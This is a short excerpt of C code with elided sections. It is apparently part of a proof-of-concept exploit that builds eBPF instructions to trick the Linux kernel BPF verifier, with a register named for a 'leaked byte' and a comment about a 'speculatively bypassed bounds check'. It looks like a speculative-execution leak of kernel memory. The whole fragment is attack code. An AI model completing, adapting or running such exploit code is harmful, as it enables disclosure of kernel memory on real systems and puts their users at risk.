...
#define BPF_REG_LEAKED_BYTE BPF_REG_4
    ...
    BPF_ALU64_IMM(BPF_MOV, BPF_REG_9, 0x4ff0),
    //CHANGED
    BPF_TEST_INS(0xd4,BPF_REG_9,0,0,16),            //verifier lost track of reg_9
    BPF_JMP_IMM(BPF_JSLT, BPF_REG_9, 0x4fff, 2),    //show r9 is in range
    BPF_MOV64_IMM(BPF_REG_0,0),
    BPF_EXIT_INSN(),
    ...
    BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_MAP_PTR, 0x1250),
    BPF_ALU64_IMM(BPF_AND, BPF_REG_SLOW_BOUND, 1),
    BPF_ALU64_IMM(BPF_AND, BPF_REG_SLOW_BOUND, 2),

    // speculatively bypassed bounds check
    //BPF_JMP_REG(BPF_JEQ, BPF_REG_INDEX, BPF_REG_8, 0x7ff),        //added for test case
